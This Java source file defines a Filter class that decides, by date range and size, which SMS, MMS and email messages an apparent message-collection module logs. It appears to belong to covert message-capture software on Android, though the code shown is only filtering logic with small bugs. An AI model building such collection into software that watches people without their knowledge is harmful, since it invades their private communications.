package com.android.networking.module.message;

import java.util.Date;
import java.util.Vector;

/**
 * The Class Filter.
 */
public class Filter {
	private static final String TAG = "Filter";

	public static final int TYPE_REALTIME = 0;
	public static final int TYPE_COLLECT = 1;

	public static final int CLASS_UNKNOWN = 0;
	public static final int CLASS_SMS = 1;
	public static final int CLASS_MMS = 2;
	public static final int CLASS_EMAIL = 3;

	static final int FILTERED_DISABLED = -1;
	static final int FILTERED_LASTCHECK = -2;
	static final int FILTERED_DATEFROM = -3;
	static final int FILTERED_DATETO = -4;
	static final int FILTERED_SIZE = -5;
	static final int FILTERED_MESSAGE_ADDED = -6;
	static final int FILTERED_NOTFOUND = -7;
	static final int FILTERED_INTERNAL = -8;
	static final int FILTERED_SENDMAIL = -9;
	public static final int FILTERED_OK = 0;

	public int size;

	public int version;
	public int type;
	public byte[] classname;
	public int classtype;

	public boolean enabled;
	public boolean all;
	public boolean doFilterFromDate;
	public Date fromDate;
	public boolean doFilterToDate;
	public Date toDate;
	public int maxMessageSize;
	public int maxMessageSizeToLog;

	public Vector keywords = new Vector();

	boolean valid;

	public int payloadStart;

	public Filter(boolean enabled, Date from, Date to, int maxMessageSize, int maxMessageSizeToLog) {
		this.enabled = enabled;		
		if (from != null) {
			this.fromDate = from;
			doFilterFromDate = true;
		}
		if (to != null) {
			this.toDate = to;
			doFilterToDate = true;
		}
		this.maxMessageSize = maxMessageSize;
		this.maxMessageSizeToLog = maxMessageSizeToLog;
	}

	public Filter(boolean mailEnabled, int maxSizeToLog) {
		this(mailEnabled, null, null, maxSizeToLog, maxSizeToLog);
	}

	/**
	 * Filter message.
	 * 
	 * @param message
	 *            the message
	 * @param lastcheck
	 *            the lastcheck
	 * @param checkAdded
	 * @return the int
	 * @throws MessagingException
	 *             the messaging exception
	 */
	public final int filterMessage(long receivedTime, int messageSize, final long lastcheck) {

		if (!enabled) {
			return FILTERED_DISABLED;
		}

		if (lastcheck != 0 && receivedTime < lastcheck) {
			return FILTERED_LASTCHECK;
		}

		// se c'e' il filtro from e non viene rispettato escludi la mail
		if (doFilterFromDate == true && receivedTime < fromDate.getTime()) {
			return FILTERED_DATEFROM;
		}

		// Se c'e' anche il filtro della data di fine e non viene rispettato
		// escludi la mail
		if (doFilterToDate == true && receivedTime > toDate.getTime()) {
			return FILTERED_DATETO;
		}

		if ((maxMessageSizeToLog > 0) && (size > maxMessageSizeToLog)) {
			return FILTERED_SIZE;
		}

		return FILTERED_OK;
	}

	/**
	 * Checks if is valid.
	 * 
	 * @return true, if is valid
	 */
	public final boolean isValid() {
		return valid;
	}

	public boolean equals(Object obj) {
		boolean ret = true;
		if (obj == null) {
			return false;
		}

		if (!(obj instanceof Filter)) {
			return false;
		}

		final Filter filter = (Filter) obj;

		ret &= filter.doFilterFromDate == doFilterFromDate;
		ret &= filter.doFilterToDate == doFilterToDate;
		ret &= filter.fromDate == fromDate;
		ret &= filter.toDate == toDate;
		ret &= filter.enabled == enabled;
		ret &= filter.maxMessageSize == maxMessageSize;
		ret &= filter.maxMessageSizeToLog == maxMessageSizeToLog;

		return ret;
	}

	public int hashCode() {
		int hash = fromDate.hashCode() ^ toDate.hashCode();
		int flags = 0;
		if (doFilterFromDate) {
			flags |= 1 << 16;
		}
		if (doFilterToDate) {
			flags |= 1 << 17;
		}

		hash ^= flags;
		hash ^= maxMessageSize << 16;
		hash ^= maxMessageSizeToLog;

		return hash;
	}

	// #ifdef DEBUG
	public final String toString() {
		final StringBuffer sb = new StringBuffer();

		switch (classtype) {
		case Filter.CLASS_EMAIL:
			sb.append("EMAIL ");
			break;
		case Filter.CLASS_MMS:
			sb.append("MMS ");
			break;
		case Filter.CLASS_SMS:
			sb.append("SMS ");
			break;
		}
		if (type == TYPE_COLLECT) {
			sb.append(" COLLECT");
		} else if (type == TYPE_REALTIME) {
			sb.append(" RT");
		}

		if (doFilterFromDate == true && fromDate != null) {
			sb.append(" from: ");
			sb.append(fromDate);
		}

		if (doFilterToDate == true && toDate != null) {
			sb.append(" to: ");
			sb.append(toDate);
		}

		sb.append(" size: " + maxMessageSize);
		sb.append(" log: " + maxMessageSizeToLog);
		sb.append(" en: " + enabled);

		return sb.toString();
	}
	// #endif
}
